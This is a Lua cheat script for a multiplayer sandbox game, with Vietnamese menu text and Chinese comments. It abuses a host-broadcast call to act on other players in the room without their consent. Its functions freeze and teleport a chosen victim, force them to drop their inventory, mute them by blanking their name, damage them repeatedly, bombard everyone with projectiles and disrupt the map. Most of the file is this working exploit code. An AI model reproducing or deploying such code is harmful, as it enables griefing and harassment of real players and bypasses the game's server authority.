GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng laser\nBên phải bật laser",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            _G.ztmn_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Laser đã dừng")
            
        elseif btnType == 1 then  -- 右边按钮：开启
            _G.ztmn_enabled = true
            ShowGameTipsWithoutFilter("#c00ffffLaser đã bật - từ mọi hướng")
            
            -- 启动炸图循环
            threadpool:work(function()
                while _G.ztmn_enabled do
                    -- 获取自己当前位置
                    local my_x, my_y, my_z = CurMainPlayer:getPosition(0, 0, 0)
                    local center_x = my_x / 100
                    local center_y = my_y / 100
                    local center_z = my_z / 100
                    
                    -- 向四面八方发射（8个方向）
                    for angle = 0, 315, 45 do  -- 0°, 45°, 90°, 135°, 180°, 225°, 270°, 315°
                        local rad = math.rad(angle)  -- 角度转弧度
                        
                        -- 计算目标位置（距离50-100格）
                        local distance = math.random(50, 100)
                        local target_x = center_x + math.cos(rad) * distance
                        local target_z = center_z + math.sin(rad) * distance
                        local target_y = center_y
                        
                        -- 发射投掷物（从自己位置射向目标）
                        local tdata = {
                            [1] = "world",
                            [2] = "spawnProjectile",
                            [3] = {
                                AccountManager:getUin(),
                                15509,  -- 火龙果ID
                                center_x, center_y + 2, center_z,  -- 发射位置（自己位置稍微抬高）
                                target_x, target_y, target_z,       -- 目标位置
                                500
                            }
                        }
                        
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                        end)
                    end
                    
                    threadpool:wait(0.2)  -- 0.2秒发射一轮
                end
            end)
        end
    end
)
end


function bf1()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/096d816716f4f311fd3a78d9f2dfd3fc.mp3", 0)
end

function bf2()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/08d4196d5ad306c7505159a4113ad549.mp3", 0)
end

function bf3()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/1c77ceb3251448c5c1f656939f9e490b.mp3", 0)
end

function bf4()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/9917f2147a24fff85a81ff5ef7428f13.mp3", 0)
end

function bf5()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/47c70e475c8d9ef84999596ad6b6e33c.mp3", 0)
end

function bf6()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/8038415b8214f96d21b9c5fdbcae9fcc.mp3", 0)
end


function bf7()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/5c889ce89b6a26bbd4337c43782af86a.mp3", 0)
end


function bf8()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/e31825397524e0557521d76f9a167170.mp3", 0)
end

function bf9()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/50c7531b5b188a2acd31ae8b7da5efdf.mp3", 0)
end


function bf10()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/79042f40a3b2a2c8dae775669a859aff.mp3", 0)
end


function zxkz()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 控位+禁止移动功能（左边停止，右边开启并选择目标）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng điều khiển vị trí\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止控位 =====
            _G.control_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng điều khiển vị trí")
            
            -- ===== 恢复所有被控玩家的移动 =====
            threadpool:work(function()
                threadpool:wait(0.1)
                -- 这里需要记录被控的玩家UIN，简单起见先遍历所有玩家
                local uin_list = GetPlayerUinList()
                for _, uin in ipairs(uin_list) do
                    local moveTdata = {
                        [1] = "actor",
                        [2] = "setActionAttrState",
                        [3] = { uin, _G.PLAYERATTR.ENABLE_MOVE, true }  -- true = 恢复移动
                    }
                    pcall(function() 
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, moveTdata) 
                    end)
                end
                ShowGameTipsWithoutFilter("#c00ffffĐã khôi phục di chuyển cho tất cả người chơi")
            end)
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启控位 =====
            _G.control_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.control_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list <= 1 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                _G.control_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu điều khiển vị trí",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần điều khiển vị trí")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu điều khiển vị trí")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ---=== 白名单检查开始 ===---
                if whitelist and whitelist[targetUin] then
                    ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
                    _G.control_enabled = false
                    return
                end
                ---=== 白名单检查结束 ===---
                
                -- ===== 禁止目标玩家移动 =====
                local moveTdata = {
                    [1] = "actor",
                    [2] = "setActionAttrState",
                    [3] = { targetUin, _G.PLAYERATTR.ENABLE_MOVE, false }  -- false = 禁止移动
                }
                pcall(function() 
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, moveTdata) 
                end)
                -- ============================
                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn mục tiêu:" .. targetUin .. ", bắt đầu vòng lặp điều khiển vị trí (tâm ngắm chỉ đâu, người đó sẽ tới đó; đã cấm di chuyển)")
                
                -- 启动控位循环
                threadpool:work(function()
                    local loopCount = 0
                    local myUin = AccountManager:getUin()
                    
                    while _G.control_enabled do
                        loopCount = loopCount + 1
                        
                        -- 获取自己的准心位置
                        InitGameAPI()
                        GameVmTriggerInit()
                        local ret, aimX, aimY, aimZ = GameVM.Player:getAimPos(myUin)
                        
                        if ret == ErrorCode.OK then
                            -- 将目标玩家传送到准心位置
                            local posTdata = {
                                [1] = "player",
                                [2] = "setPosition",
                                [3] = {targetUin, aimX, aimY, aimZ}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, posTdata) 
                            end)
                            
                            -- 每50次重新确认禁止移动（防止被恢复）
                            if loopCount % 50 == 0 then
                                local moveTdata = {
                                    [1] = "actor",
                                    [2] = "setActionAttrState",
                                    [3] = { targetUin, _G.PLAYERATTR.ENABLE_MOVE, false }
                                }
                                pcall(function() 
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, moveTdata) 
                                end)
                            end
                            
                            -- 每100次显示一次提示
                            if loopCount % 100 == 0 then
                                ShowGameTipsWithoutFilter("#cFFAA00Đang điều khiển vị trí... Mục tiêu:" .. targetUin .. " Vị trí:" .. string.format("%.1f,%.1f,%.1f", aimX, aimY, aimZ))
                            end
                        else
                            if loopCount % 50 == 0 then
                                ShowGameTipsWithoutFilter("#cFF0000Không thể lấy vị trí tâm ngắm")
                            end
                        end
                        
                        -- 极速更新
                        threadpool:wait(0.01)  -- 每0.01秒更新一次
                    end
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp điều khiển vị trí đã kết thúc")
                end)
            end
            -- ====================
        end
    end
)
end
                    



function dtms()

ShowPlayerList(function(uin)
    
    for i=1000, 9000 do
grid_index=i
        tdata = {}
    tdata[1] = "backpack";
    tdata[2] = "discardItem";
    tdata[3] = {uin,grid_index,1}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end
    end, "Người chơi ném đồ")
end


function kzyd()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 速度控制功能（左边停止，右边开启并选择目标）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng điều khiển tốc độ\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止速度控制 =====
            _G.sd_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng điều khiển tốc độ")
            
            -- 恢复所有玩家速度
            threadpool:work(function()
                threadpool:wait(0.5)
                if not _G.sd_enabled then
                    local num = ClientCurGame:getNumPlayerBriefInfo()
                    for i = 1, num do
                        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                        if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                            local tdata = {}
                            tdata[1] = "actor"
                            tdata[2] = "appendSpeed"
                            tdata[3] = {briefInfo.uin, 0, 0, 0}  -- 0,0,0 = 停止移动
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                            end)
                        end
                    end
                    ShowGameTipsWithoutFilter("#c00ffffĐã khôi phục tốc độ cho tất cả người chơi")
                end
            end)
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启速度控制 =====
            _G.sd_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.sd_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                _G.sd_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu điều khiển tốc độ",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần điều khiển tốc độ")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu điều khiển")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                ---=== 白名单检查开始 ===---
                    if whitelist[targetUin] then
                        ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
                        _G.sd_enabled = false  -- 停止本次
                        return
                    end
                    ---=== 白名单检查结束 ===---
                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. targetUin .. ", bắt đầu vòng lặp điều khiển tốc độ")
                
                -- 启动速度控制循环
                threadpool:work(function()
                    local loopCount = 0
                    
                    while _G.sd_enabled do
                        loopCount = loopCount + 1
                        
                        -- ===== 速度控制代码 =====
                        -- 参数说明：{uin, x速度, y速度, z速度}
                        -- 设置0,0,0可以让玩家无法移动
                        local tdata = {}
                        tdata[1] = "actor"
                        tdata[2] = "appendSpeed"
                        tdata[3] = {targetUin, 1, 0, 1}  -- 停止移动
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                        end)
                        -- =======================
                        
                        -- 每10次显示一次提示
                        
                        
                        threadpool:wait(0.1)  -- 0.1秒执行一次
                    end
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp điều khiển tốc độ đã kết thúc")
                end)
            end
            -- ====================
        end
    end
)
end


function jywj()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 修改玩家名字功能（选择目标后立即修改）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái hủy\nBên phải chọn mục tiêu để cấm chat",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：取消
            ShowGameTipsWithoutFilter("#cFF0000Đã hủy")
            
        elseif btnType == 1 then  -- 右边按钮：选择目标
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn người chơi cần cấm chat",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần cấm chat")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để cấm chat")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ---=== 白名单检查开始 ===---
                    if whitelist[targetUin] then
                        ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
                        return
                    end
                    ---=== 白名单检查结束 ===---
                
                -- ===== 修改名字代码（只执行一次）=====
                local tdata = {}
                tdata[1] = "actor"
                tdata[2] = "setnickname"
                tdata[3] = {targetUin, " "}
                
                pcall(function() 
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                    ShowGameTipsWithoutFilter("#c00ffffĐã thay đổi người chơi " .. targetUin .. " trạng thái cấm chat")
                end)
                -- ===================================
            end
        end
    end
)
end


function wjzc()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 玩家自残功能（左边停止，右边开启并选择目标）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng tự gây sát thương\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止自残 =====
            _G.zc_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng tự gây sát thương")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启自残 =====
            _G.zc_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.zc_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                _G.zc_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu tự gây sát thương",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần tự gây sát thương")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu tự gây sát thương")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                ---=== 白名单检查开始 ===---
                    if whitelist[targetUin] then
                        ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
                        _G.zc_enabled = false  -- 停止本次秒杀
                        return
                    end
                    ---=== 白名单检查结束 ===---
                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. targetUin .. ", bắt đầu vòng lặp tự gây sát thương")
                
                -- 启动自残循环
                threadpool:work(function()
                    local loopCount = 0
                    local myUin = AccountManager:getUin()
                    
                    while _G.zc_enabled do
                        loopCount = loopCount + 1
                        
                        -- ===== 自残代码 =====
                        -- 参数说明：{攻击者UIN, 受害者UIN, 伤害值, 未知参数}
                        -- 这里让玩家攻击自己（自残）
                        local tdata = {
                            [1] = "actor",
                            [2] = "playerHurt",
                            [3] = {targetUin, targetUin, 5000, 0}  -- 自己打自己
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                        end)
                        -- ===================
                        
              
                        
                        threadpool:wait(0.1)  -- 0.2秒自残一次
                    end
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp tự gây sát thương đã kết thúc,")
                end)
            end
            -- ====================
        end
    end
)
end

function ztmn()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 炸图模拟器功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng phá bản đồ\nBên phải bật phá bản đồ",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止炸图 =====
            _G.ztmn_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng phá bản đồ")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启炸图 =====
            _G.ztmn_enabled = true
            ShowGameTipsWithoutFilter("#c00ffffĐã bật phá bản đồ")
            
            -- 启动炸图循环
            threadpool:work(function()
                while _G.ztmn_enabled do
                    -- 获取当前房间所有玩家
                    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
                    local myUin = AccountManager:getUin()
                    
                    for i = 1, size do
                        if not _G.ztmn_enabled then break end
                        
                        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
                        if targetPlayer then
                            local targetUin = targetPlayer:getUin()
                            if targetUin ~= myUin then
                                -- 获取目标位置
                                local x, z, y = targetPlayer:getPosition(0, 0, 0)
                                local scaled_x, scaled_y, scaled_z = x * 0.01, y * 0.01, z * 0.01
                                
                                -- 获取自己位置
                                local my_x, my_y, my_z = CurMainPlayer:getPosition(0, 0, 0)
                                local new_x, new_y, new_z = my_x / 100, my_y / 100, my_z / 100
                                
                                -- 发射投掷物（火龙果）
                                local tdata = {
                                    [1] = "world",
                                    [2] = "spawnProjectile",
                                    [3] = {myUin, 15056, new_x, new_y, new_z, scaled_x, scaled_y, scaled_z, 500}
                                }
                                pcall(function() 
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                                end)
                            end
                        end
                    end
                    
                    threadpool:wait(0.1)  -- 0.1秒发射一轮
                end
            end)
            -- ====================
        end
    end
)
end
function gbtk()
-- 改变天空功能（左边停止，右边开启）
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng nhấp nháy bầu trời\nBên phải bật nhấp nháy bầu trời",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止天空闪烁 =====
            _G.skybox_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng nhấp nháy bầu trời")
            
            -- 恢复默认天空盒
            threadpool:work(function()
                threadpool:wait(0.5)
                if not _G.skybox_enabled then
                    local tdata = {
                        [1] = "world",
                        [2] = "SetSkyBoxMaps",
                        [3] = {0, 0, ""}
                    }
                    pcall(function() 
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                    end)
                    ShowGameTipsWithoutFilter("#c00ffffĐã khôi phục skybox mặc định")
                end
            end)
            -- =========================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启天空闪烁 =====
            _G.skybox_enabled = true
            ShowGameTipsWithoutFilter("#c00ffffĐã bật nhấp nháy bầu trời")
            
            -- 启动天空闪烁循环
            threadpool:work(function()
                local skyboxIds = {30005, 30006, 30007, 30008, 30009}
                local index = 1
                
                while _G.skybox_enabled do
                    -- 设置天空盒
                    local tdata = {
                        [1] = "world",
                        [2] = "SetSkyBoxMaps",
                        [3] = {1, skyboxIds[index], ""}
                    }
                    pcall(function() 
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                    end)
                    
                    -- 切换到下一个
                    index = index + 1
                    if index > #skyboxIds then index = 1 end
                    
                    threadpool:wait(0.2)  -- 0.3秒切换一次
                end
            end)
            -- =========================
        end
    end
)
end


function sjls()
    -- 先检查是否在游戏中
    if not ClientCurGame or not ClientCurGame:isInGame() then
        ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
        return
    end
    
    tdata = {}
    tdata[1] = "world";
    tdata[2] = "SetTimeVanishingSpeed";
    tdata[3] = {100}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function czzy()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local base_x, base_y, base_z = x / 100, y / 100, z / 100
    
    local size = 10
    local start_x = base_x + 5
    local top_y = base_y + size
    
    for dx = 0, size - 1 do
        local current_x = start_x + dx
        for dy = 0, size - 1 do
            local current_y = base_y + dy
            for dz = 0, size - 1 do
                local current_z = base_z - dz
                local tdata = {
                    [1] = "block",
                    [2] = "placeBlock",
                    [3] = { 835, current_x, current_y, current_z, 0, -1 }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end
    end
    
    local gap = (size - 1) / 4
    for i = 0, 4 do
        local pos_x = start_x + i * gap
        local pos_z = base_z - (size - 1) / 2
        local pos_y = top_y + 0.5
        
        local tdata = {
            [1] = "block",
            [2] = "placeBlock",
            [3] = { 6, pos_x, pos_y, pos_z, 0, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
end

function tdwg()
for a = 0, 100000 do
        threadpool:wait(0.1)
        local tdata1 = {
            [1] = "graphics",
            [2] = "createGraphicsTxtByActor",
            [3] = { AccountManager:getUin(), { title = "#cFFAAFFHoa khắp núi #cFFBBEEkhắp đồng #cFFCCDDrồi #cFFDDCCcuối cùng cũng #cFFEEBBnở", fontsize = 20, apha = 5, itype = 2, Type = 'GRAPHICS.GRAPHICS_HORNBOOK' }, { x = 0, y = 160, z = 0 }, 1.2, 0, 115 }
        }
        local tdata2 = {
            [1] = "graphics",
            [2] = "createGraphicsImageByActor",
            [3] = { AccountManager:getUin(), { imgid = 10099, scale = 0.7, apha = 90, id = 1, Type = 'GRAPHICS.GRAPHICS_IMAGE' }, { x = 0, y = 50, z = 0 }, 1, 0, 150 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
    end
end

function qseb()
 getglobal("AccChangeColorBtn"):Show()
    for a = 0, 100000 do
        threadpool:wait(0.1)
        getglobal("AccSummonBtn"):SetPoint("right", "AccRideChangeBtn", "left", -80, 0)
        threadpool:work(function()
            getglobal("AccSummonBtn"):Show()
            
            function AccSummonBtn_OnClick()
                math.randomseed(os.time() + math.random())
                local idList = {
                    "mob_3101", "mob_3101", "mob_3102", "mob_3105", "mob_3107",
                    "mob_3109", "mob_3121", "mob_3130", "mob_3131", "mob_3244",
                    "mob_3255", "mob_3411", "mob_3416", "mob_3418", "mob_3419",
                    "mob_3419", "mob_3420", "mob_3425", "mob_3502", "mob_3521",
                    "mob_3600", "mob_3601", "mob_3608", "mob_3803"
                }
                
                if #idList == 0 then
                    ShowGameTipsWithoutFilter("idList is empty")
                    return
                end
                
                local randomIndex = math.random(1, #idList)
                local selectedId = idList[randomIndex]
                
                local tdata = {
                    [1] = "actor",
                    [2] = "changeCustomModel",
                    [3] = { AccountManager:getUin(), selectedId }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                ShowGameTipsWithoutFilter("" .. selectedId)
            end
        end)
    end
end

function sjyd()
  getglobal("AccChangeColorBtn"):Show()
for a = 0, 100000 do
        threadpool:wait(0.1)
        getglobal("EditorBackBtn"):SetPoint("bottomleft", "PlayMainFrame", "bottomleft", 1120, -400)
        threadpool:work(function()
            getglobal("EditorBackBtn"):Show()
            
            function EditorBackBtn_OnClick()
                for a = 0, 5 do
                    threadpool:wait(0.01)
                    CurMainPlayer:playSkinAct(20, AccountManager:getUin(), AccountManager:getUin())
                end
            end
        end)
    end
end

function csfy()
    if not ClientCurGame or ClientCurGame._originalSendChat then return end
    
    local START_R, START_G, START_B = 255, 170, 255
    local END_R, END_G, END_B = 255, 238, 187
    
    local function padHex(num) return string.format("%02X", num) end
    
    local function getGradientColor(index, total)
        if total <= 1 then return "#c" .. padHex(START_R) .. padHex(START_G) .. padHex(START_B) end
        local ratio = (index - 1) / (total - 1)
        local r = math.floor(START_R + (END_R - START_R) * ratio + 0.5)
        local g = math.floor(START_G + (END_G - START_G) * ratio + 0.5)
        local b = math.floor(START_B + (END_B - START_B) * ratio + 0.5)
        return "#c" .. padHex(r) .. padHex(g) .. padHex(b)
    end
    
    local function applyColorToText(str)
        local ok, rawStr = pcall(tostring, str or "")
        if not ok or rawStr == "" then return str or "" end
        
        local char_list = {}
        local i = 1
        while i <= #rawStr do
            local c = rawStr:byte(i)
            local len = 1
            if c >= 192 and c <= 223 then len = 2
            elseif c >= 224 and c <= 239 then len = 3
            elseif c >= 240 and c <= 247 then len = 4 end
            table.insert(char_list, rawStr:sub(i, i + len - 1))
            i = i + len
        end
        
        local result = {}
        for idx, char in ipairs(char_list) do
            table.insert(result, getGradientColor(idx, #char_list) .. char)
        end
        return table.concat(result)
    end
    
    local originalSendChat = ClientCurGame.sendChat
    ClientCurGame._originalSendChat = originalSendChat
    
    function ClientCurGame:sendChat(originalMsg)
        local coloredMsg = originalMsg
        local ok, res = pcall(applyColorToText, originalMsg)
        if ok then coloredMsg = res end
        
        if type(originalSendChat) == "function" then
            originalSendChat(self, coloredMsg)
        else
            ClientCurGame.sendChat(self, coloredMsg)
        end
    end
end

function czjb()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local base_x, base_y, base_z = x / 100, y / 100, z / 100
    
    for dx = -1, 1 do
        local tdata = {
            [1] = "block",
            [2] = "placeBlock",
            [3] = { 1, base_x + dx, base_y, base_z, 0, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
    
    for dy = 1, 3 do
        local tdata = {
            [1] = "block",
            [2] = "placeBlock",
            [3] = { 1, base_x, base_y + dy, base_z, 0, -1 }
        }
